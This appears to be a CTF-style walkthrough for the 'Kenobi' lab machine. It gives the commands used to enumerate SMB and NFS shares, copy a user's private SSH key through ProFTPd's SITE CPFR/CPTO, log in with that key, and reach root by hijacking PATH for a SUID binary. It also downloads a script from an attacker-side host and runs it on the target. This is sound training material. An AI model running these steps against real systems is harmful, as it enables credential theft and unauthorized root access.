---
description: Walkthrough on exploiting a Linux machine
---

# Kenobi

## :desktop: Deploy the vulnerable machine

### #2 **Scan the machine with nmap, how many ports are open?**

```bash
sudo nmap 10.10.253.108
```

![](<../../.gitbook/assets/Screenshot from 2020-08-25 18-07-46.png>)

## :mag: Enumerating Samba for shares

### #1 Using the nmap command above, how many shares have been found?

```bash
sudo nmap -p 445 --script smb-enum-shares,smb-enum-users 10.10.253.108
```

![](<../../.gitbook/assets/Screenshot from 2020-08-25 18-37-28.png>)

### #2 Once you're connected, list the files on the share. What is the file can you see?

```bash
smbclient //10.10.253.108/anonymous
```

![](<../../.gitbook/assets/Screenshot from 2020-08-25 18-20-02.png>)

### **#3 What port is FTP running on?**

```bash
smbget -R smb://10.10.253.108/anonymous
sed -n '23,33p' log.txt
```

![](<../../.gitbook/assets/Screenshot from 2020-08-25 18-25-27.png>)

![](<../../.gitbook/assets/Screenshot from 2020-08-25 18-52-38.png>)

### #4 What mount can we see?

```bash
sudo nmap -p 111 --script nfs-ls,nfs-statfs,nfs-showmount 10.10.253.108
```

![](<../../.gitbook/assets/Screenshot from 2020-08-25 18-56-47.png>)

## :file\_cabinet: Gain initial access with ProFtpd

### #1 What is the version?

#### Solution 1

```bash
sudo nmap -sV -p21 10.10.253.108
```

![](<../../.gitbook/assets/Screenshot from 2020-08-25 19-01-48.png>)

#### Solution 2

```bash
nc -nv 10.10.253.108 21
```

![](<../../.gitbook/assets/Screenshot from 2020-08-25 19-04-59.png>)

### #2 How many exploits are there for the ProFTPd running?

```bash
searchsploit proftpd 1.3.5
```

![](<../../.gitbook/assets/Screenshot from 2020-08-25 19-10-41.png>)

### #3 We know that the FTP service is running as the Kenobi user (from the file on the share) and an ssh key is generated for that user.

```bash
sed -n '50,52p' log.txt
cat log.txt | head -21
```

![](<../../.gitbook/assets/Screenshot from 2020-08-25 19-16-29.png>)

![](<../../.gitbook/assets/Screenshot from 2020-08-25 19-17-51.png>)

### #4 We knew that the /var directory was a mount we could see (task 2, question 4). So we've now moved Kenobi's private key to the /var/tmp directory.

```bash
nc -nv 10.10.253.108 21
SITE CPFR /home/kenobi/.ssh/id_rsa
SITE CPTO /var/tmp/id_rsa
```

![](<../../.gitbook/assets/Screenshot from 2020-08-25 19-26-42.png>)

### #5 What is Kenobi's user flag (/home/kenobi/user.txt)?

```bash
mkdir -p /mnt/kenobi
sudo mount -o tcp 10.10.253.108:/var /mnt/kenobi
cp /mnt/kenobi/tmp/id_rsa .
chmod 600 id_rsa
ssh -i id_rsa kenobi@10.10.253.108
cat user.txt
```

![](<../../.gitbook/assets/Screenshot from 2020-08-25 19-40-39.png>)

## :top: Privilege Escalation with Path Variable Manipulation

### #1 What file looks particularly out of the ordinary?

#### Solution 1

```
wget http://10.9.101.193/suid3num.py
python suid3num.py
```

![](<../../.gitbook/assets/Screenshot from 2020-08-25 19-51-55.png>)

#### Solution 2

```
find / -type f -perm -4000 2>/dev/null
```

![](<../../.gitbook/assets/Screenshot from 2020-08-25 19-46-05.png>)

### #2 **Run the binary, how many options appear?**

```
menu
```

![](<../../.gitbook/assets/Screenshot from 2020-08-25 19-50-29.png>)

### #3 As this file runs as the root users privileges, we can manipulate our path gain a root shell.

```
strings /usr/bin/menu | sed -n '23,25p'
```

![](<../../.gitbook/assets/Screenshot from 2020-08-25 20-08-58.png>)

### #4 **What is the root flag (/root/root.txt)?**

```
cp /bin/bash /tmp/
PATH=/tmp:$PATH menu
3
cat /root/root.txt
```

![](<../../.gitbook/assets/Screenshot from 2020-08-25 20-03-29.png>)
